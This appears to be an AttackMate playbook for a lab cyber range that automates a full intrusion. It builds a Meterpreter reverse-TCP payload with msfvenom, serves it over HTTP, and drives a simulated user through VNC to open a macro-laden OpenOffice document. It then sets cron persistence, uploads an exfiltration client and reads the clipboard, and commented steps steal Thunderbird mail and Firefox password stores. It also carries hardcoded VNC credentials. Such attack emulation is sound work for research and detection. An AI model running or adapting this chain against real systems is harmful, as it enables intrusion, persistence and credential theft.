# Client opens an Open Office Document with a macro that download and executes payload
# persistence via browser binary

vars:
  PAYLOAD: linux/x64/meterpreter/reverse_tcp
  LPORT: 4443
  ATTACKMATE_IP: 192.42.1.174
  CLIENT_IP: 192.168.50.100
  MGMT_IP: 192.42.0.201
  MGMT_USERNAME: aecid
  CLIENT_VNC_PORT: 5900
  CLIENT_VNC_USER: judy
  CLIENT_VNC_PASSWORD: garland
  ATTACKER_VNC_PORT: 5901
  RUSTDESK_PACKAGE: https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb


commands:
  # establish ssh tunneling via mgmt host, everything sent to attacker port 5902 will be forwarded to client port 5901 (vnc)
  # ssh -i /home/aecid/.ssh/attacker -o StrictHostKeyChecking=no -L 5902:192.168.50.100:5901 aecid@192.42.0.201


##################### SSH TUNNEL VIA MGMT HOST ############################

  - type: shell
    interactive: true
    creates_session: tunnel
    cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"

################### SERVE THE METERPRETER PAYLOAD ############################


  # tempfile for reverse shell payload
  - type: mktemp
    cmd: file
    variable: RSHELL
  
  # generate reverse shell
  - type: shell
    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKMATE_IP LPORT=$LPORT -f elf > ${RSHELL}
  
  # serve payload via http
  - type: webserv
    local_path: $RSHELL
    port: 8080
    background: True

  # prepare reverse-shell-listener
  - type: msf-module
    creates_session: revshell
    cmd: exploit/multi/handler
    payload: $PAYLOAD
    payload_options:
      LHOST: $ATTACKMATE_IP
      LPORT: $LPORT
    background: true
    kill_on_exit: true

################### CLIENT OPENS DOCUMENT ############################

  - type: vnc
    cmd: capture
    filename: initial_screenshot.png
    hostname: localhost
    port: 5902
    creates_session: client

# Opening a terminal from the menu

  - type: vnc
    cmd: move
    x: 5
    y: 5
    session: client

  - type: vnc
    cmd: click
    session: client

  - type: sleep
    seconds: 3

  - type: vnc
    cmd: type
    input: "terminal"
    session: client
    
  - type: sleep
    seconds: 3

  - type: vnc
    cmd: key
    key: "enter"
    session: client

  - type: sleep
    seconds: 3

# copy something to the clipboard
  - type: vnc 
    cmd: type 
    input: echo 'Dummy Text' | xclip -selection clipboard
    session: client

  - type: sleep
    seconds: 3

  - type: vnc
    cmd: key
    key: "enter"
    session: client

  - type: sleep
    seconds: 3

# Open the Document with the malicious macro
  - type: vnc 
    cmd: type 
    input: "soffice /home/judy/Nutzungshinweise.odt"
    session: client

  - type: sleep
    seconds: 3

  - type: vnc
    cmd: key
    key: "enter"
    session: client

################### ATTACKER INTERACTS WITH METERPRETER ############################
  # run commands via reverse shell
  - type: msf-session
    stdapi: true
    session: revshell
    cmd: sysinfo

################### PERSISTENCE OPTION A, CRON JOB ############################

 # upload cronjob
  - type: msf-session
    session: revshell
    cmd: upload crontab.txt

 # upload cronjob
  - type: msf-session
    session: revshell
    cmd: upload downloader.txt


 # upload veiltransfer-client
  - type: msf-session
    session: revshell
    cmd: upload /home/aecid/VeilTransfer/veiltransfer_client_linux /home/judy/.local/bin


################### ATTACKER GATHERS INFORMATION ############################

 # download Emails
 # - type: msf-session
 #   session: revshell
 #   cmd: download /home/judy/.thunderbird/user.default-release/Mail/'Local Folders'/Inbox

 # get interactive shell
  - type: msf-session
    cmd: shell
    session: revshell

  - type: msf-session
    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
    session: revshell
 
  - type: msf-session
    cmd: export SHELL=bash
    session: revshell
 
  - type: msf-session
    cmd: export TERM=xterm256-color
    session: revshell

  - type: msf-session
    cmd: stty rows 38 columns 116
    session: revshell

  - type: msf-session
    cmd: export DISPLAY=:0
    session: revshell

  - type: msf-session
    cmd: export PROFILE=$(basename /home/judy/.mozilla/firefox/*.dev-edition-default | cut -d"." -f1)
    session: revshell

  - type: msf-session
    cmd: echo $PROFILE
    session: revshell

#  - type: setvar
#    cmd: $RESULT_STDOUT
#    variable: FIREFOXPROFILE
#
#  - type: debug
#    cmd: firefox profile $FIREFOXPROFILE
 
 


# make the veiltransfer client binary executable
  - type: msf-session
    session: revshell
    cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux && sleep 5

  # add the persistence cronjob
  - type: msf-session
    session: revshell
    cmd: crontab /home/judy/crontab.txt

  # get the last clipboard entry
  - type: msf-session
    session: revshell
    cmd: xclip -selection clipboard -o

  # add the cronjob to extract data
  - type: msf-session
    session: revshell
    cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -

#  # send the emails via veiltransfer
#  - type: msf-session
#    session: revshell
#    cmd: veiltransfer_client_linux transfer quic -localPath /home/judy/.thunderbird/user.default-release/Mail/'Local Folders'/Inbox

  # exit the interactive shell
  - type: msf-session
    session: revshell
    cmd: exit

# # extract firefox session store
#  - type: msf-session
#    session: revshell
#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILE.dev-edition-default/sessionstore-backups/recovery.jsonlz4
#
# # extract firefox password decryption keys
#  - type: msf-session
#    session: revshell
#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILEPROFILE.dev-edition-default/key4.db
#
# # extract firefox passwords
#  - type: msf-session
#    session: revshell
#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILEPROFILE.dev-edition-default/logins.json

#
#  # 
#  - type: msf-session
#    session: revshell
#    cmd: 


